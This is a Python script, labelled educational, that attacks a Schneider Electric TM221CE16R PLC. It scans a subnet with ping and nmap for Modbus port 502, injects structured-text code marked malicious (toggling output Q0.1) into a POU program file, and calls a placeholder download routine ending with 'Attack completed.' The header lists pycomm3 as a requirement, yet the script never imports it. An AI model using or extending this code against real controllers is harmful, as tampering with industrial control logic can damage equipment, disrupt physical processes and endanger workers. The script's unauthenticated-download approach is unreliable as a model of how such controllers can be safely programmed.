#Requires: pycomm3 and a Schneider Electric TM221CE16R PLC on the network.
#This script assumes the PLC allows programming downloads without authentication.
#In a real-world scenario, authentication and security measures should be implemented.
#THIS SCRIPT IS FOR EDUCATIONAL AND TESTING PURPOSES ONLY. DO NOT USE IN PRODUCTION ENVIRONMENTS WITHOUT PROPER SECURITY REVIEW.

import subprocess
import re
import os

def get_plc_ip_address():
    """
    Attempts to find the PLC's IP address by pinging a range of addresses
    and checking for a response using Schneider Electric's Modbus protocol.
    """
    # Define a range of IP addresses to scan (e.g., a local subnet)
    base_ip = "192.168.9."
    for i in range(1, 255):
        ip_address = base_ip + str(i)
        try:
            # Ping the IP address
            ping_result = subprocess.run(["ping", "-n", "1", ip_address], capture_output=True, timeout=1, text=True)
            if "Reply from" in ping_result.stdout:
                print(f"Ping successful: {ip_address}")

                # Check if Modbus is responding (Schneider Electric uses Modbus)
                # THIS IS A SIMPLIFIED CHECK. PROPER MODBUS COMMUNICATION REQUIRES MORE ROBUST HANDLING.
                # For example, using pyModbus library instead of grep to confirm the device type.
                try:
                    # Use nmap to check for Modbus (port 502)
                    nmap_result = subprocess.run(["nmap", "-p", "502", ip_address], capture_output=True, timeout=2, text=True)

                    if "502/tcp open  modbus?" in nmap_result.stdout:
                      print(f"Potentially Schneider PLC found at: {ip_address}")
                      return ip_address # Return the IP if ping is successful
                except Exception as e:
                    print(f"Nmap check failed for {ip_address}: {e}")


        except subprocess.TimeoutExpired:
            print(f"Ping timed out for {ip_address}")
        except Exception as e:
            print(f"Error pinging {ip_address}: {e}")
    return None  # If no PLC found, return None

def create_modified_pou(original_pou_path, new_pou_path, new_code):
    """
    Creates a modified POU file with injected malicious code.  Assumes the
    original POU is a text file that can be easily modified. For binary formats,
    more sophisticated parsing and modification would be required.

    Args:
        original_pou_path: Path to the original POU file.
        new_pou_path: Path to save the modified POU file.
        new_code: The malicious structured text code to inject.
    """
    try:
        with open(original_pou_path, 'r') as infile:
            pou_content = infile.read()

        # Inject the malicious code *before* the final "END_PROGRAM" statement.
        #  This is a simple example; more robust parsing may be needed
        #  depending on the POU's structure.
        injection_point = pou_content.rfind("END_PROGRAM")
        if injection_point != -1:
            modified_pou_content = pou_content[:injection_point] + "\n\n// *** MALICIOUS CODE INJECTED ***\n" + new_code + "\n\n" + pou_content[injection_point:]
        else:
            print("Warning: Could not find END_PROGRAM statement.  Appending malicious code to end.")
            modified_pou_content = pou_content + "\n\n// *** MALICIOUS CODE INJECTED ***\n" + new_code + "\n\nEND_PROGRAM" #append the new code and add the missing END_PROGRAM statement

        with open(new_pou_path, 'w') as outfile:
            outfile.write(modified_pou_content)

        print(f"Modified POU created at: {new_pou_path}")

    except FileNotFoundError:
        print(f"Error: Original POU file not found: {original_pou_path}")
    except Exception as e:
        print(f"Error creating modified POU: {e}")


def download_program_to_plc(plc_ip_address, modified_pou_path):
    """
    Downloads the modified program to the PLC. This is a placeholder.
    In reality, this requires using the PLC vendor's proprietary software
    or libraries. This is just an example that illustrates how the
    attack *would* occur.  It is not functional without the necessary
    Schneider Electric specific tools.

    Args:
        plc_ip_address: IP address of the PLC.
        modified_pou_path: Path to the modified POU file.
    """
    print(f"Attempting to download {modified_pou_path} to PLC at {plc_ip_address}...")

    # *** REPLACE THIS WITH ACTUAL PLC PROGRAMMING SOFTWARE CALL ***
    # This is a placeholder for the vendor-specific command-line tool
    # or API call that would perform the program download.  For example,
    # Schneider Electric's EcoStruxure Machine Expert software likely has
    # a command-line interface that can be used.

    # Example using a hypothetical command-line tool:
    # command = ["machine_expert_cli", "download", "-ip", plc_ip_address, "-project", modified_pou_path]
    # subprocess.run(command, check=True)

    print("Placeholder: PLC program download initiated.  Requires vendor-specific tool.")


if __name__ == "__main__":
    plc_ip = get_plc_ip_address()
    if not plc_ip:
        print("PLC not found on the network. Exiting.")
        exit()

    print(f"PLC IP Address: {plc_ip}")

    # 1. Define paths and malicious code
    original_pou_path = "MainProgram.pou"  # Replace with your actual POU path
    modified_pou_path = "MainProgram_modified.pou"
    malicious_code = """
    // *** INJECTED MALICIOUS CODE ***
    // This code could manipulate outputs, modify variables, or perform other
    // unauthorized actions. This example toggles Q0.1 every second.
    Timer2(IN := TRUE, PT := T#1S); // Using Timer2, assuming it is available.
    IF Timer2.Q THEN
        %Q0.1 := NOT %Q0.1;
        Timer2.IN := FALSE; // Reset the timer
    END_IF;
    // *** END MALICIOUS CODE ***
    """

    # 2. Create the modified POU
    create_modified_pou(original_pou_path, modified_pou_path, malicious_code)

    # 3. Download the modified program to the PLC
    # WARNING: This step can be destructive and could damage the PLC or process.
    # Only execute in a controlled test environment.
    download_program_to_plc(plc_ip, modified_pou_path) #download to the plc



    print("Attack completed.  Check the PLC for the injected behavior.")